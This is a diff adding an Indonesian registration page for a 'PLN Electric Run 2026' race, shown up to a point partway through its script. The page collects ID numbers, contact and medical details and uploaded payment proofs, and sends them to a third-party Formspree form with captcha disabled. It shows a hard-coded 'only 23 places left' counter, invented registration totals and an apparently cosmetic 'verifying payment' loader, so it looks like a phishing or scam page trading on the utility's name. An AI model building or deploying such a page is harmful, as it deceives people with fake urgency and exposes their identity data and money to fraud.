@@ -1,0 +1,475 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" name="viewport">
+<title>Registrasi — PLN Electric Run 2026</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link href="https://fonts.googleapis.com" rel="preconnect">
+<link crossorigin href="https://fonts.gstatic.com" rel="preconnect">
+<link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Anton&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+<style>
+:root{--g:#059669;--gd:#047857;--gl:#10B981;--gs:#ECFDF5;--el:#FBBF24;--cr:#FFF8F0;--ink:#1A1A1A;--mu:#6B6B73;--ln:#E8E8EC;--bg:#FAFAFA}
+*{-webkit-font-smoothing:antialiased;box-sizing:border-box}
+html,body{background:var(--bg);color:var(--ink);font-family:'Plus Jakarta Sans',sans-serif}
+.fd{font-family:'Anton',sans-serif;letter-spacing:.01em}
+.fm{font-family:'JetBrains Mono',monospace}
+
+#initLoad{position:fixed;inset:0;z-index:9999;background:radial-gradient(circle at center,#064E3B,#022c22);display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .5s,visibility .5s}
+#initLoad.hide{opacity:0;visibility:hidden;pointer-events:none}
+.il-logo{width:90px;height:90px;border-radius:18px;object-fit:cover;box-shadow:0 0 40px rgba(16,185,129,.6);animation:hb 1.5s ease-in-out infinite}
+@keyframes hb{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+.il-track{width:260px;height:4px;background:rgba(255,255,255,.2);border-radius:2px;overflow:hidden;margin-top:40px}
+.il-fill{height:100%;width:0%;background:linear-gradient(90deg,#10B981,#FBBF24,#FFF);border-radius:2px;animation:lp 2s cubic-bezier(.4,0,.2,1) forwards}
+@keyframes lp{0%{width:0}60%{width:80%}100%{width:100%}}
+.il-t{color:#fff;font-family:'Anton',sans-serif;letter-spacing:.15em;margin-top:25px;font-size:1.3rem}
+.il-s{color:rgba(255,255,255,.6);font-size:.75rem;margin-top:8px;font-family:'JetBrains Mono',monospace}
+
+.hero{position:relative;background:#022c22;overflow:hidden}
+.hero-vid{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;z-index:0}
+.hero::before{content:'';position:absolute;inset:0;z-index:1;background:linear-gradient(90deg,rgba(2,28,18,.92),rgba(2,28,18,.75) 50%,rgba(2,28,18,.5))}
+.dots{background-image:radial-gradient(rgba(255,255,255,.15) 1px,transparent 1px);background-size:20px 20px}
+.otag{display:inline-flex;align-items:center;gap:8px;padding:6px 14px;border-radius:999px;background:linear-gradient(90deg,rgba(251,191,36,.25),rgba(16,185,129,.25));border:1px solid rgba(255,255,255,.35);color:#FFF;font-weight:700;font-size:11px;letter-spacing:.18em;margin-bottom:12px;backdrop-filter:blur(6px)}
+.odot{width:7px;height:7px;border-radius:50%;background:#10B981;box-shadow:0 0 8px #10B981;animation:blk 1.4s ease-in-out infinite}
+@keyframes blk{0%,100%{opacity:1}50%{opacity:.3}}
+.talert{background:linear-gradient(90deg,#047857,#059669 50%,#047857);background-size:200% 100%;animation:abg 4s linear infinite;box-shadow:0 8px 28px rgba(5,150,105,.45)}
+@keyframes abg{0%{background-position:0% 50%}100%{background-position:200% 50%}}
+.aic{animation:ws 1.2s ease-in-out infinite;display:inline-block}
+@keyframes ws{0%,100%{transform:rotate(0)}25%{transform:rotate(-8deg)}75%{transform:rotate(8deg)}}
+.tcnt{font-family:'Anton',sans-serif;font-size:clamp(1.5rem,4vw,2.5rem);color:#FBBF24;text-shadow:0 0 18px rgba(251,191,36,.85);animation:cp 1.6s ease-in-out infinite;display:inline-block}
+@keyframes cp{0%,100%{transform:scale(1)}50%{transform:scale(1.12)}}
+.pbt{height:8px;background:rgba(255,255,255,.25);border-radius:999px;overflow:hidden}
+.pbf{height:100%;width:96%;background:linear-gradient(90deg,#FBBF24,#10B981);border-radius:999px}
+.sn{transition:all .4s cubic-bezier(.16,1,.3,1);color:var(--mu)}
+.sn.active{background:var(--g);color:#fff;border-color:var(--g);box-shadow:0 4px 14px rgba(5,150,105,.35)}
+.sn.done{background:var(--gl);color:#fff;border-color:var(--gl)}
+.fld{background:#fff;border:1.5px solid var(--ln);border-radius:10px;transition:all .2s;font-size:15px;width:100%;font-family:inherit;color:var(--ink)}
+.fld:focus{border-color:var(--g);box-shadow:0 0 0 4px rgba(5,150,105,.1);outline:none}
+.fld:read-only{background:#f8f8f8;color:var(--mu);cursor:not-allowed}
+.flbl{font-size:13px;font-weight:600;color:var(--ink);margin-bottom:6px;display:flex;align-items:center;gap:6px}
+.flbl .rq{color:var(--g)}
+.qbtn{width:44px;height:44px;display:flex;align-items:center;justify-content:center;background:#fff;border:1.5px solid var(--ln);border-radius:10px;cursor:pointer;transition:all .2s;font-size:16px;font-weight:bold;color:var(--g)}
+.qbtn:hover:not(:disabled){background:var(--gs);border-color:var(--g)}
+.qbtn:disabled{opacity:.35;cursor:not-allowed}
+.qinp{width:60px;height:44px;text-align:center;font-weight:800;font-size:18px;border:1.5px solid var(--ln);border-radius:10px;background:#fff;font-family:inherit}
+.crd{background:#fff;border-radius:20px;box-shadow:0 1px 3px rgba(0,0,0,.04),0 8px 24px rgba(0,0,0,.04);border:1px solid rgba(0,0,0,.04)}
+.bp{background:var(--g);color:#fff;font-weight:700;border-radius:10px;transition:all .2s;box-shadow:0 4px 12px rgba(5,150,105,.25);font-family:inherit;cursor:pointer;border:none}
+.bp:hover:not(:disabled){background:var(--gd);transform:translateY(-1px)}
+.bp:disabled{opacity:.35;cursor:not-allowed}
+.bs{background:#fff;color:var(--ink);border:1.5px solid var(--ln);font-weight:600;border-radius:10px;transition:all .2s;font-family:inherit;cursor:pointer}
+.bs:hover{border-color:var(--ink);background:#F5F5F7}
+.sp{display:none}.sp.active{display:block;animation:su .4s cubic-bezier(.16,1,.3,1)}
+@keyframes su{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+.rc{border:1.5px solid var(--ln);border-radius:12px;cursor:pointer;transition:all .2s;background:#fff}
+.rc.sel{border-color:var(--g);background:var(--gs);box-shadow:0 0 0 3px rgba(5,150,105,.1)}
+.tst{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);background:var(--ink);color:#fff;padding:12px 20px;border-radius:10px;font-size:14px;z-index:100;opacity:0;transition:all .3s;display:flex;align-items:center;gap:8px;white-space:nowrap}
+.tst.show{transform:translateX(-50%) translateY(0);opacity:1}
+.mq{display:flex;gap:3rem;animation:mq 25s linear infinite;white-space:nowrap}
+@keyframes mq{0%{transform:translateX(0)}100%{transform:translateX(-50%)}}
+.fl1{animation:fl1 7s ease-in-out infinite}
+.fl2{animation:fl1 9s ease-in-out infinite reverse}
+@keyframes fl1{0%,100%{transform:translateY(0)}50%{transform:translateY(-15px)}}
+.tg{text-shadow:0 0 30px rgba(16,185,129,.5)}
+.mo{position:fixed;inset:0;background:rgba(0,0,0,.6);backdrop-filter:blur(4px);z-index:60;display:none;align-items:center;justify-content:center;padding:1rem}
+.mo.show{display:flex}
+.ccb{width:22px;height:22px;border:2px solid var(--ln);border-radius:6px;cursor:pointer;appearance:none;-webkit-appearance:none;transition:all .2s;position:relative;flex-shrink:0;background:#fff}
+.ccb:checked{background:var(--g);border-color:var(--g)}
+.ccb:checked::after{content:'✓';color:#fff;font-size:14px;font-weight:bold;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%)}
+#pLoad{position:fixed;inset:0;z-index:99999;background:radial-gradient(circle at 50% 50%,#064E3B,#022c22 70%,#000);display:none;flex-direction:column;align-items:center;justify-content:center;overflow:hidden}
+#pLoad.show{display:flex}
+.pl-c{position:relative;z-index:10;display:flex;flex-direction:column;align-items:center;max-width:520px;width:90%;padding:2rem;text-align:center}
+.pl-logo{width:72px;height:72px;border-radius:16px;object-fit:cover;box-shadow:0 0 30px rgba(16,185,129,.6);animation:hb 1.5s ease-in-out infinite}
+.pl-t{font-family:'Anton',sans-serif;color:#fff;font-size:1.6rem;letter-spacing:.1em;margin-bottom:10px;text-shadow:0 0 30px rgba(16,185,129,.6)}
+.pl-s{color:rgba(255,255,255,.6);font-size:.85rem;margin-bottom:35px;font-family:'JetBrains Mono',monospace}
+.pl-wrap{width:100%;max-width:420px}
+.pl-tk{height:8px;background:rgba(255,255,255,.08);border-radius:999px;overflow:hidden}
+.pl-fl{height:100%;width:0%;border-radius:999px;background:linear-gradient(90deg,#059669,#10B981,#FBBF24);box-shadow:0 0 15px rgba(16,185,129,.7);transition:width .1s linear}
+.pl-info{display:flex;justify-content:space-between;margin-top:14px;font-family:'JetBrains Mono',monospace;font-size:.8rem;color:#fff}
+</style>
+</head>
+<body>
+
+<div id="initLoad">
+<img alt="Logo PLN" class="il-logo" src="logo.png" onerror="this.src='https://placehold.co/90x90/059669/FFFFFF?text=PLN'">
+<div class="il-track"><div class="il-fill"></div></div>
+<div class="il-t">PLN ELECTRIC RUN 2026</div>
+<div class="il-s">MEMUAT FORMULIR REGISTRASI...</div>
+</div>
+
+<header class="sticky top-0 z-40 bg-white/90 backdrop-blur-md border-b border-[var(--ln)]">
+<div class="max-w-6xl mx-auto px-4 sm:px-6 py-3.5 flex items-center justify-between">
+<div class="flex items-center gap-3">
+<img alt="Logo" class="w-10 h-10 rounded-lg object-cover shadow-md" src="logo.png" onerror="this.src='https://placehold.co/40/059669/FFFFFF?text=PLN'">
+<div>
+<div class="fd text-base leading-none tracking-wider">PLN ELECTRIC RUN</div>
+<div class="text-[10px] tracking-[0.25em] text-[var(--g)] font-semibold mt-0.5">REGISTRASI · TANGERANG 2026</div>
+</div>
+</div>
+<div class="hidden sm:flex items-center gap-4 text-sm">
+<div class="flex items-center gap-2 text-[var(--mu)]"><i class="fa-solid fa-phone text-xs"></i><span class="fm">0812-6789-1011</span></div>
+<a aria-label="Instagram" class="text-[var(--mu)] hover:text-[var(--g)] transition" href="#"><i class="fa-brands fa-instagram"></i></a>
+</div>
+</div>
+</header>
+
+<section class="hero">
+<video autoplay muted loop playsinline class="hero-vid"><source src="vidio.mp4" type="video/mp4"></video>
+<div class="absolute inset-0 dots opacity-30 z-[1]"></div>
+<div class="absolute top-10 right-10 w-32 h-32 rounded-full bg-[var(--g)] opacity-30 blur-3xl fl1 z-[1]"></div>
+<div class="absolute bottom-10 left-20 w-40 h-40 rounded-full bg-[var(--el)] opacity-20 blur-3xl fl2 z-[1]"></div>
+<div class="relative max-w-6xl mx-auto px-4 sm:px-6 py-10 md:py-14 z-10">
+<div class="flex flex-col md:flex-row md:items-end justify-between gap-6">
+<div>
+<span class="otag"><span class="odot"></span><i class="fa-solid fa-wifi"></i> REGISTRASI ONLINE</span>
+<div class="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-[var(--g)]/20 border border-[var(--g)]/30 mb-4 backdrop-blur-sm">
+<span class="w-1.5 h-1.5 rounded-full bg-[var(--gl)] animate-pulse"></span>
+<span class="text-[11px] tracking-[0.2em] text-emerald-200 font-semibold">KUOTA TERBATAS · EARLY BIRD 30% OFF</span>
+</div>
+<h1 class="fd text-4xl md:text-6xl text-white leading-[0.9]">PLN ELECTRIC RUN<br><span class="text-[var(--gl)] tg">POWERING OUR GREEN FUTURE</span></h1>
+<p class="mt-3 text-white/80 text-sm md:text-base max-w-md font-medium">Lengkapi data Anda untuk mendaftar PLN Electric Run 2026 di ICE BSD Tangerang.</p>
+</div>
+<div class="flex items-center gap-4">
+<div class="text-center"><div class="fd text-3xl text-white">08.11</div><div class="text-[10px] tracking-widest text-white/70">NOV 2026</div></div>
+<div class="w-px h-12 bg-white/30"></div>
+<div class="text-center"><div class="fd text-3xl text-white">21K</div><div class="text-[10px] tracking-widest text-white/70">ICE BSD</div></div>
+</div>
+</div>
+</div>
+<div class="relative border-t border-white/10 py-3 overflow-hidden bg-black/40 z-10">
+<div class="mq text-xs tracking-[0.2em] text-white/60 font-semibold">
+<span>● 08 NOVEMBER 2026</span><span>● ICE BSD TANGERANG</span><span>● EARLY BIRD 30% OFF</span>
+<span>● HALF MARATHON RP 455.000</span><span>● 10K RP 350.000</span><span>● 5K RP 280.000</span>
+<span>● POWERING OUR GREEN FUTURE</span><span>● 08 NOVEMBER 2026</span><span>● ICE BSD TANGERANG</span>
+<span>● EARLY BIRD 30% OFF</span><span>● HALF MARATHON RP 455.000</span><span>● 10K RP 350.000</span>
+</div>
+</div>
+</section>
+
+<section class="talert">
+<div class="max-w-6xl mx-auto px-4 sm:px-6 py-4 md:py-5 relative z-10">
+<div class="flex flex-col md:flex-row items-center justify-between gap-4">
+<div class="flex items-center gap-4 text-white">
+<span class="aic text-3xl md:text-4xl">⚠️</span>
+<div>
+<div class="text-[10px] md:text-xs font-bold tracking-[0.25em] text-white/80 mb-1">KUOTA TERBATAS</div>
+<div class="flex items-baseline gap-2 flex-wrap">
+<span class="text-sm font-semibold">KUOTA TERSISA UNTUK</span>
+<span class="tcnt" id="tcnt">23</span>
+<span class="text-sm font-semibold">PESERTA LAGI!</span>
+</div>
+</div>
+</div>
+<div class="w-full md:w-72">
+<div class="flex justify-between text-[10px] md:text-xs text-white/85 font-semibold mb-1.5">
+<span><i class="fa-solid fa-fire text-[#FBBF24]"></i> 577 TERDAFTAR</span>
+<span>600 KUOTA TOTAL</span>
+</div>
+<div class="pbt"><div class="pbf"></div></div>
+</div>
+</div>
+</div>
+</section>
+
+<main class="max-w-6xl mx-auto px-4 sm:px-6 py-8 md:py-12" id="formSec">
+<div class="mb-8 md:mb-12">
+<div class="flex items-center justify-between max-w-3xl mx-auto relative">
+<div class="absolute top-6 left-[12.5%] right-[12.5%] h-1 bg-[var(--ln)] rounded-full -z-0">
+<div class="h-full bg-gradient-to-r from-[var(--g)] to-[var(--gl)] rounded-full transition-all duration-500" id="pLine" style="width:0%"></div>
+</div>
+<div class="relative z-10 flex flex-col items-center flex-1">
+<div class="sn active w-12 h-12 rounded-full bg-white border-2 border-[var(--ln)] flex items-center justify-center fd" data-step="1">01</div>
+<div class="mt-2 text-[11px] md:text-xs font-semibold text-center">Data Diri</div>
+</div>
+<div class="relative z-10 flex flex-col items-center flex-1">
+<div class="sn w-12 h-12 rounded-full bg-white border-2 border-[var(--ln)] flex items-center justify-center fd" data-step="2">02</div>
+<div class="mt-2 text-[11px] md:text-xs font-semibold text-center text-[var(--mu)]">Alamat & Kontak</div>
+</div>
+<div class="relative z-10 flex flex-col items-center flex-1">
+<div class="sn w-12 h-12 rounded-full bg-white border-2 border-[var(--ln)] flex items-center justify-center fd" data-step="3">03</div>
+<div class="mt-2 text-[11px] md:text-xs font-semibold text-center text-[var(--mu)]">Pembayaran</div>
+</div>
+<div class="relative z-10 flex flex-col items-center flex-1">
+<div class="sn w-12 h-12 rounded-full bg-white border-2 border-[var(--ln)] flex items-center justify-center fd" data-step="4">04</div>
+<div class="mt-2 text-[11px] md:text-xs font-semibold text-center text-[var(--mu)]">Selesai</div>
+</div>
+</div>
+</div>
+
+<div class="crd p-6 md:p-10 relative z-10">
+<form id="regForm" action="https://formspree.io/f/mkodppbj" method="POST" enctype="multipart/form-data" novalidate>
+<input type="hidden" name="_subject" value="Registrasi PLN Electric Run 2026">
+<input type="hidden" name="_template" value="table">
+<input type="hidden" name="_captcha" value="false">
+
+<!-- STEP 1 -->
+<div class="sp active" data-panel="1">
+<div class="flex items-center gap-3 mb-1"><div class="w-1 h-7 bg-[var(--g)] rounded-full"></div><h2 class="fd text-2xl md:text-3xl">DATA DIRI PESERTA</h2></div>
+<p class="text-sm text-[var(--mu)] mb-8 ml-4">Pastikan data sesuai dengan KTP/SIM/Kartu Pelajar yang masih berlaku.</p>
+<div class="grid md:grid-cols-2 gap-5">
+<div class="md:col-span-2"><label class="flbl">Nama Lengkap <span class="rq">*</span></label><input class="fld px-4 py-3" name="nama" required type="text" placeholder="Contoh: Budi Santoso"></div>
+<div><label class="flbl">NIK / No. KTP <span class="text-[var(--mu)] text-xs">(Opsional)</span></label><input class="fld px-4 py-3 fm" name="nik" type="text" placeholder="Isi jika tersedia"></div>
+<div><label class="flbl">Tanggal Lahir <span class="rq">*</span></label><input class="fld px-4 py-3" name="tgl_lahir" required type="date"></div>
+<div><label class="flbl">Jenis Kelamin <span class="rq">*</span></label><select class="fld px-4 py-3" name="jenis_kelamin" required><option value="">Pilih...</option><option>Laki-laki</option><option>Perempuan</option></select></div>
+<div><label class="flbl">No. WhatsApp <span class="rq">*</span></label><div class="relative"><span class="absolute left-4 top-1/2 -translate-y-1/2 text-[var(--mu)] fm text-sm">+62</span><input class="fld pl-12 pr-4 py-3 fm" name="wa" required type="tel" placeholder="812 3456 7890"></div></div>
+<div><label class="flbl">Email Aktif <span class="rq">*</span></label><input class="fld px-4 py-3" name="email" required type="email" placeholder="email@contoh.com"></div>
+<div><label class="flbl">Kategori Lomba <span class="rq">*</span></label><select class="fld px-4 py-3" id="catSel" name="kategori" required><option value="280000">5K Fun Run - Rp 280.000</option><option value="350000">10K Challenge - Rp 350.000</option><option value="455000">Half Marathon - Rp 455.000</option></select></div>
+<div><label class="flbl">Jumlah Tiket <span class="rq">*</span></label><div class="flex items-center gap-3"><button class="qbtn" data-action="qty-dec" type="button"><i class="fa-solid fa-minus"></i></button><input class="qinp" id="tQty" readonly type="number" value="1"><button class="qbtn" data-action="qty-inc" type="button"><i class="fa-solid fa-plus"></i></button><span class="text-xs text-[var(--mu)] ml-2">Maks 10</span></div></div>
+<div><label class="flbl">Ukuran Jersey <span class="rq">*</span><button class="ml-auto text-xs text-green-600 hover:text-green-800 font-medium" data-action="open-modal" type="button"><i class="fa-solid fa-ruler"></i> Size Chart</button></label>
+<div class="grid grid-cols-5 gap-2">
+<label class="rc text-center py-3 font-semibold text-sm"><input class="hidden" name="ukuran_jersey" required type="radio" value="S">S</label>
+<label class="rc text-center py-3 font-semibold text-sm sel"><input checked class="hidden" name="ukuran_jersey" type="radio" value="M">M</label>
+<label class="rc text-center py-3 font-semibold text-sm"><input class="hidden" name="ukuran_jersey" type="radio" value="L">L</label>
+<label class="rc text-center py-3 font-semibold text-sm"><input class="hidden" name="ukuran_jersey" type="radio" value="XL">XL</label>
+<label class="rc text-center py-3 font-semibold text-sm"><input class="hidden" name="ukuran_jersey" type="radio" value="XXL">XXL</label>
+</div></div>
+<div class="md:col-span-2"><label class="flbl">Nama Bib (maks 12 karakter)</label><input class="fld px-4 py-3" maxlength="12" name="nama_bib" type="text" placeholder="Nama yang dicetak di nomor dada"></div>
+</div>
+<div class="flex justify-end mt-8 pt-6 border-t border-[var(--ln)]"><button class="bp px-8 py-3.5 inline-flex items-center gap-2" data-action="next" data-from="1" type="button">LANJUT <i class="fa-solid fa-arrow-right"></i></button></div>
+</div>
+
+<!-- STEP 2 -->
+<div class="sp" data-panel="2">
+<div class="flex items-center gap-3 mb-1"><div class="w-1 h-7 bg-[var(--g)] rounded-full"></div><h2 class="fd text-2xl md:text-3xl">ALAMAT & KONTAK DARURAT</h2></div>
+<p class="text-sm text-[var(--mu)] mb-8 ml-4">Data alamat untuk pengiriman paket dan kontak darurat saat event.</p>
+<div class="grid md:grid-cols-2 gap-5">
+<div class="md:col-span-2"><label class="flbl">Alamat Lengkap <span class="rq">*</span></label><textarea class="fld px-4 py-3" name="alamat" required rows="2" placeholder="Jalan, nomor rumah, RT/RW, kelurahan"></textarea></div>
+<div><label class="flbl">Kota / Kabupaten <span class="rq">*</span></label><input class="fld px-4 py-3" name="kota" readonly type="text" value="Tangerang"></div>
+<div><label class="flbl">Provinsi <span class="rq">*</span></label><input class="fld px-4 py-3" name="provinsi" readonly type="text" value="Banten"></div>
+<div><label class="flbl">Kode Pos</label><input class="fld px-4 py-3 fm" maxlength="5" name="kode_pos" type="text" placeholder="15322"></div>
+<div><label class="flbl">Golongan Darah <span class="rq">*</span></label><select class="fld px-4 py-3" name="gol_darah" required><option value="">Pilih...</option><option>A</option><option>B</option><option>AB</option><option>O</option><option>Tidak Tahu</option></select></div>
+<div><label class="flbl">Nama Kontak Darurat <span class="rq">*</span></label><input class="fld px-4 py-3" name="nama_darurat" required type="text" placeholder="Contoh: Siti Aminah"></div>
+<div><label class="flbl">Hubungan <span class="rq">*</span></label><select class="fld px-4 py-3" name="hubungan_darurat" required><option value="">Pilih...</option><option>Orang Tua</option><option>Suami / Istri</option><option>Saudara</option><option>Teman</option></select></div>
+<div class="md:col-span-2"><label class="flbl">No. HP Darurat <span class="rq">*</span></label><div class="relative"><span class="absolute left-4 top-1/2 -translate-y-1/2 text-[var(--mu)] fm text-sm">+62</span><input class="fld pl-12 pr-4 py-3 fm" name="hp_darurat" required type="tel" placeholder="812 3456 7890"></div></div>
+<div class="md:col-span-2"><label class="flbl">Riwayat Penyakit / Alergi</label><textarea class="fld px-4 py-3" name="riwayat_penyakit" rows="2" placeholder="Kosongkan jika tidak ada."></textarea></div>
+</div>
+<div class="flex justify-between mt-8 pt-6 border-t border-[var(--ln)]">
+<button class="bs px-6 py-3.5 inline-flex items-center gap-2" data-action="prev" data-from="2" type="button"><i class="fa-solid fa-arrow-left"></i> KEMBALI</button>
+<button class="bp px-8 py-3.5 inline-flex items-center gap-2" data-action="next" data-from="2" type="button">LANJUT <i class="fa-solid fa-arrow-right"></i></button>
+</div>
+</div>
+
+<!-- STEP 3 -->
+<div class="sp" data-panel="3">
+<div class="flex items-center gap-3 mb-1"><div class="w-1 h-7 bg-[var(--g)] rounded-full"></div><h2 class="fd text-2xl md:text-3xl">PEMBAYARAN</h2></div>
+<p class="text-sm text-[var(--mu)] mb-8 ml-4">Scan QRIS dan unggah bukti pembayaran.</p>
+<div class="grid lg:grid-cols-5 gap-8">
+<div class="lg:col-span-3 space-y-6">
+<div class="bg-[var(--cr)] rounded-xl p-5 border border-[var(--ln)]">
+<div class="text-xs font-bold tracking-widest text-[var(--mu)] mb-4">RINGKASAN PESANAN</div>
+<div class="flex justify-between items-center py-3 border-b border-dashed"><span class="font-semibold text-sm" id="sCat">5K Fun Run</span><span class="font-semibold text-sm" id="sPrc">Rp 280.000</span></div>
+<div class="flex justify-between items-center py-3"><span class="font-semibold text-sm">Ukuran Jersey</span><span class="font-semibold text-sm" id="sJrs">M</span></div>
+</div>
+<div>
+<div class="text-xs font-bold tracking-widest text-[var(--mu)] mb-4">SCAN QRIS UNTUK PEMBAYARAN</div>
+<div class="flex flex-col items-center gap-4 p-6 bg-[var(--cr)] rounded-xl border border-[var(--ln)]">
+<img alt="QRIS" class="w-48 h-48 object-contain" src="qris.png" onerror="this.src='https://placehold.co/200x200/FFFFFF/000000?text=QRIS'">
+<div class="text-center"><p class="text-sm font-semibold">Scan via QRIS (Semua E-Wallet/Bank)</p><p class="text-xs text-[var(--mu)] mt-1">Transfer: <span class="font-bold text-[var(--g)]" id="tpInline">Rp 280.000</span></p></div>
+</div>
+</div>
+<div>
+<label class="flbl">Upload Bukti Pembayaran <span class="rq">*</span></label>
+<input accept="image/*,application/pdf" class="fld px-4 py-2.5 file:mr-4 file:py-2 file:px-4 file:rounded-md file:border-0 file:text-sm file:font-semibold file:bg-[var(--gs)] file:text-[var(--g)] hover:file:bg-green-100" id="buktiIn" name="bukti_bayar" required type="file">
+<p class="text-xs text-[var(--mu)] mt-1.5">Format: JPG, PNG, PDF (Maks 2MB)</p>
+</div>
+</div>
+<div class="lg:col-span-2">
+<div class="sticky top-24 bg-white border border-[var(--ln)] rounded-xl p-6 shadow-sm">
+<div class="text-xs font-bold tracking-widest text-[var(--mu)] mb-4">TOTAL PEMBAYARAN</div>
+<div class="flex items-end justify-between mb-6">
+<div class="text-sm text-[var(--mu)]">Total (<span id="tQtT">1</span> Tiket)</div>
+<div class="fd text-3xl text-[var(--g)]" id="tPrc">Rp 280.000</div>
+</div>
+<div class="flex items-start gap-3 mb-4 p-3 rounded-lg bg-[var(--gs)] border border-[var(--g)]/15">
+<input type="checkbox" id="agreeCb" class="ccb mt-0.5">
+<label for="agreeCb" class="text-xs cursor-pointer leading-relaxed font-medium">Saya menyatakan data saya benar dan telah melakukan pembayaran sesuai nominal.</label>
+</div>
+<button class="bp w-full py-4 inline-flex items-center justify-center gap-2" data-action="submit" id="subBtn" type="button" disabled><i class="fa-solid fa-cloud-arrow-up"></i> KONFIRMASI PENDAFTARAN</button>
+<p class="text-xs text-center text-[var(--mu)] mt-3" id="btnHt"><i class="fa-solid fa-lock"></i> Unggah bukti & centang persetujuan</p>
+</div>
+</div>
+</div>
+<div class="flex justify-start mt-8 pt-6 border-t border-[var(--ln)]"><button class="bs px-6 py-3.5 inline-flex items-center gap-2" data-action="prev" data-from="3" type="button"><i class="fa-solid fa-arrow-left"></i> KEMBALI</button></div>
+</div>
+
+<!-- STEP 4 -->
+<div class="sp" data-panel="4">
+<div class="text-center max-w-2xl mx-auto py-8">
+<div class="flex justify-center mb-6"><div class="w-20 h-20 bg-[var(--gl)] rounded-full flex items-center justify-center"><i class="fa-solid fa-check text-white text-4xl"></i></div></div>
+<h2 class="fd text-3xl md:text-4xl mb-3">PENDAFTARAN BERHASIL!</h2>
+<p class="text-[var(--mu)] mb-8">Selamat! Pembayaran Anda sedang diverifikasi.</p>
+</div>
+</div>
+</form>
+</div>
+</main>
+
+<div class="mo" id="szModal">
+<div class="bg-white rounded-2xl max-w-md w-full p-6 relative">
+<button class="absolute top-4 right-4 text-[var(--mu)] hover:text-[var(--ink)]" data-action="close-modal"><i class="fa-solid fa-xmark text-xl"></i></button>
+<h3 class="fd text-2xl mb-4">SIZE CHART JERSEY</h3>
+<table class="w-full text-sm border-collapse">
+<thead><tr class="border-b"><th class="text-left py-2">Ukuran</th><th class="text-left py-2">Dada</th><th class="text-left py-2">Panjang</th></tr></thead>
+<tbody>
+<tr class="border-b"><td class="py-2 fm">S</td><td>48 cm</td><td>68 cm</td></tr>
+<tr class="border-b"><td class="py-2 fm">M</td><td>50 cm</td><td>70 cm</td></tr>
+<tr class="border-b"><td class="py-2 fm">L</td><td>52 cm</td><td>72 cm</td></tr>
+<tr class="border-b"><td class="py-2 fm">XL</td><td>54 cm</td><td>74 cm</td></tr>
+<tr><td class="py-2 fm">XXL</td><td>56 cm</td><td>76 cm</td></tr>
+</tbody>
+</table>
+</div>
+</div>
+
+<div class="tst" id="toast"><i class="fa-solid fa-circle-info"></i><span id="toastMsg">Pesan</span></div>
+
+<div id="pLoad">
+<div class="pl-c">
+<img alt="Logo" class="pl-logo" src="logo.png" onerror="this.src='https://placehold.co/72x72/059669/FFFFFF?text=PLN'">
+<div class="pl-t">PEMROSESAN PENDAFTARAN</div>
+<div class="pl-s" id="plSt">Memverifikasi pembayaran Anda...</div>
+<div class="pl-wrap">
+<div class="pl-tk"><div class="pl-fl" id="plFl"></div></div>
+<div class="pl-info"><span id="plPc">0%</span><span id="plTm">3:00</span></div>
+</div>
+</div>
+</div>
+
+<script>
+(function(){
+var EP="https://formspree.io/f/mkodppbj",TS=4,MQ=10,MNQ=1,PD=180000;
+var qty=1;
+var $=function(s,c){return(c||document).querySelector(s)};
+var $$=function(s,c){return Array.from((c||document).querySelectorAll(s))};
+
+setTimeout(function(){var l=document.getElementById('initLoad');if(l)l.classList.add('hide')},1500);
+
+function animTC(){var el=$('#tcnt');if(!el)return;var tgt=23,dur=1500,st=performance.now();
+function step(n){var p=Math.min((n-st)/dur,1),e=1-Math.pow(1-p,3);el.textContent=Math.floor(e*tgt);if(p<1)requestAnimationFrame(step);else el.textContent=tgt}
+requestAnimationFrame(step)}
+
+function goStep(s){
+ $$('.sp').forEach(function(p){p.classList.remove('active')});
+var pn=$('.sp[data-panel="'+s+'"]');if(pn)pn.classList.add('active');
+ $$('.sn').forEach(function(n){var ns=parseInt(n.dataset.step,10);n.classList.remove('active','done');
+if(ns<s){n.classList.add('done');n.innerHTML='<i class="fa-solid fa-check"></i>'}
+else{n.textContent=String(ns).padStart(2,'0');if(ns===s)n.classList.add('active')}});
+var ln=$('#pLine');if(ln)ln.style.width=((s-1)/(TS-1))*100+'%';
+var fs=$('#formSec');if(fs){var t=fs.getBoundingClientRect().top+window.scrollY-80;window.scrollTo({top:t,behavior:'smooth'})}
+}
+
+function valStep(s){
+var pn=$('.sp[data-panel="'+s+'"]');if(!pn)return true;
+var ok=true,first=null;
+pn.querySelectorAll('[required]').forEach(function(f){
+var v=(f.value||'').trim(),bad=!v;
+if(f.type==='email'&&v&&!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v))bad=true;
+if(f.type==='file')return;
+if(bad){ok=false;f.style.borderColor='#EF4444';if(!first)first=f}
+else{f.style.borderColor=''}
+});
+if(s===3){var fi=$('#buktiIn');if(fi&&fi.files.length>0&&fi.files[0].size/1024/1024>2){showT('Ukuran file melebihi 2MB!','error');ok=false}}
+if(!ok&&first){first.focus();showT('Mohon lengkapi data wajib (*)','error')}
+return ok
+}
+
+function nextS(f){if(!valStep(f))return;if(f<TS){goStep(f+1);if(f+1===3)updSum()}}
+function prevS(f){if(f>1)goStep(f-1)}
+
+function updPrice(){
+var sel=$('#catSel');if(!sel)return;
+var bp=parseInt(sel.value,10)||0,lbl=sel.options[sel.selectedIndex].text;
+var tp=bp*qty,fp='Rp '+tp.toLocaleString('id-ID');
+ $('#sCat').textContent=lbl+' (x'+qty+')';$('#sPrc').textContent=fp;
+ $('#tPrc').textContent=fp;$('#tQtT').textContent=qty;$('#tpInline').textContent=fp;
+var ib=$('.qbtn[data-action="qty-inc"]'),db=$('.qbtn[data-action="qty-dec"]');
+if(ib)ib.disabled=(qty>=MQ);if(db)db.disabled=(qty<=MNQ);
+}
+
